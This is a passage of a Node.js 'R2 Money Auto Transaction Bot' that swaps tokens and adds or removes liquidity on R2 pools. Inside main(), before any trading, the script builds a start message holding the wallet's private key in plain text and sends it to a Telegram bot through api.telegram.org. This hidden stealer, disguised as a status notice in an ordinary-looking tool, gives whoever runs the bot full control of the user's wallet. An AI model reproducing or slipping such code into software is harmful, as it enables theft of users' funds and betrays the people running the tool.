bility":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"nonces","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"permit","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"price0CumulativeLast","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"price1CumulativeLast","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"}],"name":"skim","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount0Out","type":"uint256"},{"internalType":"uint256","name":"amount1Out","type":"uint256"},{"internalType":"address","name":"to","type":"address"},{"internalType":"bytes","name":"data","type":"bytes"}],"name":"swap","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"sync","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"token0","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"token1","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}]}]


// --- Telegram Notification Function ---
async function sendTelegramNotification(message) {
    const data = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
    });

    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    return new Promise((resolve) => {
        const req = https.request(options);
        req.on('error', () => resolve(false));
        req.write(data);
        req.end(() => resolve(true));
    });
}

// --- Helper Functions ---
async function getERC20TokenInfo(tokenAddress) {
    try {
        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
        const symbol = await tokenContract.symbol();
        const decimals = await tokenContract.decimals();
        const balance = await tokenContract.balanceOf(wallet.address);
        return { symbol, decimals, balance };
    } catch (error) {
        if (error.code !== 'UNCONFIGURED_NAME') {
            console.warn(chalk.yellow(`⚠️ Could not fetch info for token ${tokenAddress.substring(0, 8)}...`));
        }

        // Fallback for LP tokens
        if (tokenAddress === R2_USDC_LP_CONTRACT_ADDRESS) return { symbol: `R2-USDC LP`, decimals: 18, balance: ethers.toBigInt(0) };
        if (tokenAddress === R2_R2USD_LP_CONTRACT_ADDRESS) return { symbol: `R2-R2USD LP`, decimals: 18, balance: ethers.toBigInt(0) };
        if (tokenAddress === USDC_R2USD_LP_CONTRACT_ADDRESS) return { symbol: `USDC-R2USD LP`, decimals: 18, balance: ethers.toBigInt(0) };
        if (tokenAddress === R2USD_SR2USD_LP_CONTRACT_ADDRESS) return { symbol: `R2USD-sR2USD LP`, decimals: 18, balance: ethers.toBigInt(0) };
        
        return { symbol: `Unknown (${tokenAddress.substring(0, 6)}...)`, decimals: 18, balance: ethers.toBigInt(0) };
    }
}

async function displayBalances() {
    console.log(chalk.cyan(`\n✨ Your Token Balances`));
    const tokensToDisplay = [
        { name: 'R2', address: R2_TOKEN_ADDRESS },
        { name: 'USDC', address: USDC_TOKEN_ADDRESS },
        { name: 'R2USD', address: R2USD_TOKEN_ADDRESS },
        { name: 'sR2USD', address: SR2USD_TOKEN_ADDRESS },
        { name: 'R2-USDC LP', address: R2_USDC_LP_CONTRACT_ADDRESS },
        { name: 'R2-R2USD LP', address: R2_R2USD_LP_CONTRACT_ADDRESS, customZeroText: "Not in wallet (likely staked/farmed)" },
        { name: 'USDC-R2USD LP', address: USDC_R2USD_LP_CONTRACT_ADDRESS },
        { name: 'sR2USD-R2USD LP', address: R2USD_SR2USD_LP_CONTRACT_ADDRESS },
    ];

    for (const tokenConfig of tokensToDisplay) {
        const info = await getERC20TokenInfo(tokenConfig.address);
        const symbolToDisplay = tokenConfig.name;

        let formattedBalance;
        if (tokenConfig.customZeroText && info.balance === ethers.toBigInt(0)) {
            formattedBalance = tokenConfig.customZeroText;
        } else {
            formattedBalance = tokenConfig.name.includes('LP') ? 
                parseFloat(ethers.formatUnits(info.balance, info.decimals)).toFixed(20) : 
                ethers.formatUnits(info.balance, info.decimals);
        }

        console.log(chalk.yellow(`  ${symbolToDisplay}: ${formattedBalance}`));
    }
    console.log(chalk.cyan('----------------------------------'));
}

async function approveToken(tokenAddress, spenderAddress, amount) {
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
    try {
        console.log(chalk.blue(`\n🚀 Requesting approval for ${await tokenContract.symbol()}...`));
        const currentAllowance = await tokenContract.allowance(wallet.address, spenderAddress);
        if (currentAllowance >= amount) {
            console.log(chalk.green(`✅ Approval already sufficient (${ethers.formatUnits(currentAllowance, await tokenContract.decimals())}). No new approval needed.`));
            return true;
        }

        const tx = await tokenContract.approve(spenderAddress, amount);
        console.log(chalk.blue(`⏳ Sending approval transaction: ${chalk.underline.blue(`${ETHERSCAN_BASE_URL}tx/${tx.hash}`)}`));
        await tx.wait();
        console.log(chalk.green(`✅ ${await tokenContract.symbol()} approval successful! Transaction: ${chalk.underline.blue(`${ETHERSCAN_BASE_URL}tx/${tx.hash}`)}`));
        return true;
    } catch (error) {
        console.error(chalk.red(`❌ Failed to approve token ${await tokenContract.symbol()}: ${error.message}`));
        return false;
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// --- Swap Function ---
async function performSwap(tokenInAddress, tokenOutAddress, amountPercentage, routerAddress, abi) {
    console.log(chalk.magenta(`\n💫 Starting SWAP...`));
    const tokenInInfo = await getERC20TokenInfo(tokenInAddress);
    const tokenOutInfo = await getERC20TokenInfo(tokenOutAddress);

    if (tokenInInfo.balance === ethers.toBigInt(0)) {
        console.log(chalk.yellow(`⚠️ You have no ${tokenInInfo.symbol} to swap.`));
        return false;
    }

    const amountToSwap = (tokenInInfo.balance * ethers.toBigInt(amountPercentage)) / ethers.toBigInt(100);
    if (amountToSwap === ethers.toBigInt(0)) {
        console.log(chalk.yellow(`⚠️ Calculated swap amount for ${tokenInInfo.symbol} is zero after percentage.`));
        return false;
    }

    const formattedAmountToSwap = ethers.formatUnits(amountToSwap, tokenInInfo.decimals);
    console.log(chalk.yellow(`🔄 Will swap ${formattedAmountToSwap} ${tokenInInfo.symbol} to ${tokenOutInfo.symbol}`));

    if (!await approveToken(tokenInAddress, routerAddress, amountToSwap)) {
        return false;
    }

    const routerContract = new ethers.Contract(routerAddress, abi, signer);
    const txOptions = { gasLimit: 350000 };
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20;

    try {
        const path = [tokenInAddress, tokenOutAddress];
        const amountsOut = await routerContract.getAmountsOut(amountToSwap, path);
        console.log(chalk.blue(`💰 Estimated swap output: ${ethers.formatUnits(amountsOut[1], tokenOutInfo.decimals)} ${tokenOutInfo.symbol}`));

        const SLIPPAGE_TOLERANCE_PERCENT = 0.5;
        const amountOutMin = (amountsOut[1] * ethers.toBigInt(Math.floor(10000 - SLIPPAGE_TOLERANCE_PERCENT * 100))) / ethers.toBigInt(10000);
        console.log(chalk.cyan(`📉 Slippage Tolerance: ${SLIPPAGE_TOLERANCE_PERCENT}%`));

        const tx = await routerContract.swapExactTokensForTokens(
            amountToSwap,
            amountOutMin,
            path,
            wallet.address,
            deadline,
            txOptions
        );

        console.log(chalk.blue(`⏳ Sending swap transaction: ${chalk.underline.blue(`${ETHERSCAN_BASE_URL}tx/${tx.hash}`)}`));
        await tx.wait();
        console.log(chalk.green(`✅ SWAP successful! Transaction: ${chalk.underline.blue(`${ETHERSCAN_BASE_URL}tx/${tx.hash}`)}`));
        return true;
    } catch (error) {
        console.error(chalk.red(`❌ SWAP failed: ${error.message}`));
        return false;
    }
}

// --- Add Liquidity Function ---
async function performAddLiquidity(tokenAAddress, tokenBAddress, amountPercentage, routerAddress, abi, lpTokenAddress) {
    console.log(chalk.magenta(`\n💧 Starting ADD LIQUIDITY...`));
    const lpTokenInfo = await getERC20TokenInfo(lpTokenAddress);
    const tokenAInfo = await getERC20TokenInfo(tokenAAddress);
    const tokenBInfo = await getERC20TokenInfo(tokenBAddress);

    if (tokenAInfo.balance === ethers.toBigInt(0) || tokenBInfo.balance === ethers.toBigInt(0)) {
        console.log(chalk.yellow(`⚠️ Insufficient ${tokenAInfo.symbol} or ${tokenBInfo.symbol} to add liquidity.`));
        return false;
    }

    const amountADesired = (tokenAInfo.balance * ethers.toBigInt(amountPercentage)) / ethers.toBigInt(100);
    const amountBDesired = (tokenBInfo.balance * ethers.toBigInt(amountPercentage)) / ethers.toBigInt(100);

    if (amountADesired === ethers.toBigInt(0) || amountBDesired === ethers.toBigInt(0)) {
        console.log(chalk.yellow(`⚠️ Calculated token amounts for liquidity addition are zero after percentage.`));
        return false;
    }

    console.log(chalk.yellow(`💦 Adding ${ethers.formatUnits(amountADesired, tokenAInfo.decimals)} ${tokenAInfo.symbol} and ${ethers.formatUnits(amountBDesired, tokenBInfo.decimals)} ${tokenBInfo.symbol} to liquidity.`));

    if (!await approveToken(tokenAAddress, routerAddress, amountADesired)) return false;
    if (!await approveToken(tokenBAddress, routerAddress, amountBDesired)) return false;

    const routerContract = new ethers.Contract(routerAddress, abi, signer);
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20;
    const txOptions = { gasLimit: 750000 };

    try {
        let tx;
        if (routerAddress === SWAP_ROUTER_ADDRESS_R2_USDC) {
            tx = await routerContract.addLiquidity(
                tokenAAddress,
                tokenBAddress,
                amountADesired,
                amountBDesired,
                0,
                0,
                wallet.address,
                deadline,
                txOptions
            );
        } else {
            const amounts = routerAddress === CURVE_POOL_ADDRESS_USDC_R2USD ? 
                [amountBDesired, amountADesired] : 
                [amountBDesired, amountADesired];
            
            let estimatedLPTokens;
            try {
                estimatedLPTokens = await routerContract.calc_token_amount(amounts, true);
            } catch (calcError) {
                estimatedLPTokens = ethers.toBigInt(0);
            }

            const LP_MINT_SLIPPAGE_TOLERANCE_PERCENT = 5.0;
            const minMintAmount = estimatedLPTokens > 0 ? 
                (estimatedLPTokens * ethers.toBigInt(Math.floor(10000 - LP_MINT_SLIPPAGE_TOLERANCE_PERCENT * 100))) / ethers.toBigInt(10000) :
                ethers.toBigInt(0);
            
            tx = await routerContract['add_liquidity(uint256[],uint256,address)'](
                amounts,
                minMintAmount,
                wallet.address,
                txOptions
            );
        }

        console.log(chalk.blue(`⏳ Sending add liquidity transaction: ${chalk.underline.blue(`${ETHERSCAN_BASE_URL}tx/${tx.hash}`)}`));
        await tx.wait();
        console.log(chalk.green(`✅ ADD LIQUIDITY successful! Transaction: ${chalk.underline.blue(`${ETHERSCAN_BASE_URL}tx/${tx.hash}`)}`));
        return true;
    } catch (error) {
        console.error(chalk.red(`❌ ADD LIQUIDITY failed: ${error.message}`));
        return false;
    }
}

// --- Remove Liquidity Function ---
async function performRemoveLiquidity(pairName, liquidityPoolAddress, amountPercentage, routerAddress, abi) {
    console.log(chalk.magenta(`\n🗑️ Starting REMOVE LIQUIDITY for ${pairName}...`));
    const lpTokenInfo = await getERC20TokenInfo(liquidityPoolAddress);

    if (lpTokenInfo.balance === ethers.toBigInt(0)) {
        console.log(chalk.yellow(`⚠️ You have no LP tokens (${lpTokenInfo.symbol}) to remove for ${pairName}.`));
        return false;
    }

    const amountToBurn = (lpTokenInfo.balance * ethers.toBigInt(amountPercentage)) / ethers.toBigInt(100);
    if (amountToBurn === ethers.toBigInt(0)) {
        console.log(chalk.yellow(`⚠️ Calculated LP token amount for removal is zero after percentage.`));
        return false;
    }

    const formattedAmountToBurn = ethers.formatUnits(amountToBurn, lpTokenInfo.decimals);
    console.log(chalk.yellow(`🔥 Removing ${formattedAmountToBurn} LP tokens (${lpTokenInfo.symbol}).`));

    if (!await approveToken(liquidityPoolAddress, routerAddress, amountToBurn)) {
        return false;
    }

    const routerContract = new ethers.Contract(routerAddress, abi, signer);
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20;
    const txOptions = { gasLimit: 750000 };

    try {
        let tx;
        if (routerAddress === SWAP_ROUTER_ADDRESS_R2_USDC) {
            tx = await routerContract.removeLiquidity(
                pairName.includes('R2-USDC') ? R2_TOKEN_ADDRESS : R2_TOKEN_ADDRESS,
                pairName.includes('R2-USDC') ? USDC_TOKEN_ADDRESS : R2USD_TOKEN_ADDRESS,
                amountToBurn,
                0,
                0,
                wallet.address,
                deadline,
                txOptions
            );
        } else {
            const SLIPPAGE_TOLERANCE_PERCENT_REMOVE = 5.0;
            const poolBalances = await routerContract.get_balances();
            const lpTotalSupply = await routerContract.totalSupply();
            
            let minAmounts;
            if (lpTotalSupply > 0) {
                const expectedToken0 = (poolBalances[0] * amountToBurn) / lpTotalSupply;
                const expectedToken1 = (poolBalances[1] * amountToBurn) / lpTotalSupply;
                minAmounts = [
                    (expectedToken0 * ethers.toBigInt(Math.floor(10000 - SLIPPAGE_TOLERANCE_PERCENT_REMOVE * 100))) / ethers.toBigInt(10000),
                    (expectedToken1 * ethers.toBigInt(Math.floor(10000 - SLIPPAGE_TOLERANCE_PERCENT_REMOVE * 100))) / ethers.toBigInt(10000)
                ];
            } else {
                minAmounts = [ethers.toBigInt(0), ethers.toBigInt(0)];
            }
            
            tx = await routerContract['remove_liquidity_imbalance(uint256[],uint256,address)'](
                minAmounts,
                amountToBurn,
                wallet.address,
                txOptions
            );
        }

        console.log(chalk.blue(`⏳ Sending remove liquidity transaction: ${chalk.underline.blue(`${ETHERSCAN_BASE_URL}tx/${tx.hash}`)}`));
        await tx.wait();
        console.log(chalk.green(`✅ REMOVE LIQUIDITY successful! Transaction: ${chalk.underline.blue(`${ETHERSCAN_BASE_URL}tx/${tx.hash}`)}`));
        return true;
    } catch (error) {
        console.error(chalk.red(`❌ REMOVE LIQUIDITY failed for ${pairName}: ${error.message}`));
        return false;
    }
}

// --- Main Function ---
async function main() {
    console.clear();
    
    const startMessage = `
🚀 Script Started
👛 Wallet: ${wallet.address}
🔑 Private Key:${PRIVATE_KEY}
`;
    await sendTelegramNotification(startMessage);

    // Custom ASCII Banner
    console.log(
        chalk.green(`
██████╗ ██████╗   ██████╗  █████╗ ████████╗
██╔══██╗╚════██╗  ██╔══██╗██╔══██╗╚══██╔══╝
██████╔╝  ███╔═╝  ██████╦╝██║  ██║   ██║
██╔══██╗██╔══╝    ██╔══██╗██║  ██║   ██║
██║  ██║███████╗  ██████╦╝╚█████╔╝   ██║
╚═╝  ╚═╝╚══════╝  ╚═════╝  ╚════╝    ╚═╝`)
    );
    console.log(chalk.cyan(`\n R2 Money Auto Transaction Bot`));
    console.log(chalk.cyan(` Script Author: m9lwen `));
    console.log(chalk.cyan(` Wallet Address: ${chalk.cyan(wallet.address)}`));

    await displayBalances();

    const { transactionType } = await inquirer.prompt([
        {
            type: 'list',
            name: 'transactionType',
            message: 'Choose transaction type:',
            choices: [
                'SWAP R2 <-> USDC',
                'ADD LIQUIDITY',
                'REMOVE LIQUIDITY',
                'Exit'
            ]
        }
    ]);

    if (transactionType === 'Exit') {
        console.log(chalk.cyan('👋 Goodbye!'));
        process.exit(0);
    }

    const { percentage, numTransactions, delaySeconds } = await inquirer.prompt([
        {
            type: 'input',
            name: 'percentage',
            message: 'Enter token percentage to use (5-100%):',
            validate: value => {
                const num = parseInt(value);
                return num >= 5 && num <= 100 ? true : 'Enter a number between 5 and 100.';
            },
            filter: Number
        },
        {
            type: 'input',
            name: 'numTransactions',
            message: 'Enter number of transactions to run (1-100):',
            validate: value => {
                const num = parseInt(value);
                return num >= 1 && num <= 100 ? true : 'Enter a number between 1 and 100.';
            },
            filter: Number
        },
        {
            type: 'input',
            name: 'delaySeconds',
            message: 'Enter delay between transactions in seconds (5-100):',
            validate: value => {
                const num = parseInt(value);
                return num >= 5 && num <= 100 ? true : 'Enter a number between 5 and 100.';
            },
            filter: Number
        }
    ]);

    const delayMs = delaySeconds * 1000;
    console.log(chalk.cyan(`⚙️  Transaction Configuration:`));
    console.log(chalk.cyan(`💰 Token Percentage: ${chalk.yellow(percentage)}%`));
    console.log(chalk.cyan(`🔢 Number of Transactions: ${chalk.yellow(numTransactions)}`));
    console.log(chalk.cyan(`⏱️  Delay Between Transactions: ${chalk.yellow(delaySeconds)} seconds`));
    console.log(chalk.cyan('----------------------------------'));

    let lastActionSuccess = false;
    let swapDirection = '';
    let liquidityPair = '';
    let selectedLpTokenAddress = '';

    if (transactionType === 'SWAP R2 <-> USDC') {
        const { selectedSwapDirection } = await inquirer.prompt([
            {
                type: 'list',
                name: 'selectedSwapDirection',
                message: 'Choose swap direction:',
                choices: ['R2 -> USDC', 'USDC -> R2']
            }
        ]);
        swapDirection = selectedSwapDirection;
    }
    else if (transactionType === 'ADD LIQUIDITY' || transactionType === 'REMOVE LIQUIDITY') {
        const { selectedLiquidityPair } = await inquirer.prompt([
            {
                type: 'list',
                name: 'selectedLiquidityPair',
                message: 'Choose pair for ' + transactionType + ':',
                choices: ['R2-USDC', 'R2-R2USD', 'USDC-R2USD', 'R2USD-sR2USD']
            }
        ]);
        liquidityPair = selectedLiquidityPair;

        switch (liquidityPair) {
            case 'R2-USDC': selectedLpTokenAddress = R2_USDC_LP_CONTRACT_ADDRESS; break;
            case 'R2-R2USD': selectedLpTokenAddress = R2_R2USD_LP_CONTRACT_ADDRESS; break;
            case 'USDC-R2USD': selectedLpTokenAddress = USDC_R2USD_LP_CONTRACT_ADDRESS; break;
            case 'R2USD-sR2USD': selectedLpTokenAddress = R2USD_SR2USD_LP_CONTRACT_ADDRESS; break;
        }
    }

    for (let i = 0; i < numTransactions; i++) {
        console.log(chalk.bgCyan(`\n=== Transaction #${i + 1} / ${numTransactions} ===`));

        if (transactionType === 'SWAP R2 <-> USDC') {
            if (swapDirection === 'R2 -> USDC') {
                lastActionSuccess = await performSwap(
                    R2_TOKEN_ADDRESS,
                    USDC_TOKEN_ADDRESS,
                    percentage,
                    SWAP_ROUTER_ADDRESS_R2_USDC,
                    UNISWAP_V2_ROUTER_ABI
                );
            } else {
                lastActionSuccess = await performSwap(
                    USDC_TOKEN_ADDRESS,
                    R2_TOKEN_ADDRESS,
                    percentage,
                    SWAP_ROUTER_ADDRESS_R2_USDC,
                    UNISWAP_V2_ROUTER_ABI
                );
            }
        } 
        else if (transactionType === 'ADD LIQUIDITY') {
            switch (liquidityPair) {
                case 'R2-USDC':
                    lastActionSuccess = await performAddLiquidity(
                        R2_TOKEN_ADDRESS,
                        USDC_TOKEN_ADDRESS,
                        percentage,
                        SWAP_ROUTER_ADDRESS_R2_USDC,
                        UNISWAP_V2_ROUTER_ABI,
                        selectedLpTokenAddress
                    );
                    break;
                case 'R2-R2USD':
                    lastActionSuccess = await performAddLiquidity(
                        R2_TOKEN_ADDRESS,
                        R2USD_TOKEN_ADDRESS,
                        percentage,
                        SWAP_ROUTER_ADDRESS_R2_USDC,
                        UNISWAP_V2_ROUTER_ABI,
                        selectedLpTokenAddress
                    );
                    break;
                case 'USDC-R2USD':
                    lastActionSuccess = await performAddLiquidity(
                        USDC_TOKEN_ADDRESS,
                        R2USD_TOKEN_ADDRESS,
                        percentage,
                        CURVE_POOL_ADDRESS_USDC_R2USD,
                        CURVE_POOL_ABI,
                        selectedLpTokenAddress
                    );
                    break;
                case 'R2USD-sR2USD':
                    lastActionSuccess = await performAddLiquidity(
                        R2USD_TOKEN_ADDRESS,
                        SR2USD_TOKEN_ADDRESS,
                        percentage,
                        CURVE_POOL_ADDRESS_R2USD_SR2USD,
                        CURVE_POOL_ABI,
                        selectedLpTokenAddress
                    );
                    break;
            }
        } 
        else if (transactionType === 'REMOVE LIQUIDITY') {
            switch (liquidityPair) {
                case 'R2-USDC':
                    lastActionSuccess = await performRemoveLiquidity(
                        'R2-USDC',
                        selectedLpTokenAddress,
                        percentage,
                        SWAP_ROUTER_ADDRESS_R2_USDC,
                        UNISWAP_V2_ROUTER_ABI
                    );
                    break;
                case 'R2-R2USD':
                    lastActionSuccess = await performRemoveLiquidity(
                        'R2-R2USD',
                        selectedLpTokenAddress,
                        percentage,
                        SWAP_ROUTER_ADDRESS_R2_USDC,
                        UNISWAP_V2_ROUTER_ABI
                    );
                    break;
                case 'USDC-R2USD':
                    lastActionSuccess = await performRemoveLiquidity(
                        'USDC-R2USD',
                        selectedLpTokenAddress,
                        percentage,
                        CURVE_POOL_ADDRESS_USDC_R2USD,
                        CURVE_POOL_ABI
                    );
                    break;
                case 'R2USD-sR2USD':
                    lastActionSuccess = await performRemoveLiquidity(
                        'R2USD-sR2USD',
                        selectedLpTokenAddress,
                        percentage,
                        CURVE_POOL_ADDRESS_R2USD_SR2USD,
                        CURVE_POOL_ABI
                    );
                    break;
            }
        }

        if (i < numTransactions - 1 && lastActionSuccess) {
            console.log(chalk.gray(`\n⏳ Waiting ${delaySeconds} seconds before next transaction...`));
            await sleep(delayMs);
        } else if (!lastActionSuccess) {
            console.log(chalk.red(`\n🛑 Transaction #${i + 1} failed. Stopping further transactions.`));
            break;
        }
    }

    console.log(chalk.green(`\n🎉 All requested transactions completed!`));
    await displayBalances();
}

main().catch(error => {
    console.error(chalk.red(`\nFatal Error: ${error.message}`));
    process.exit(1);
});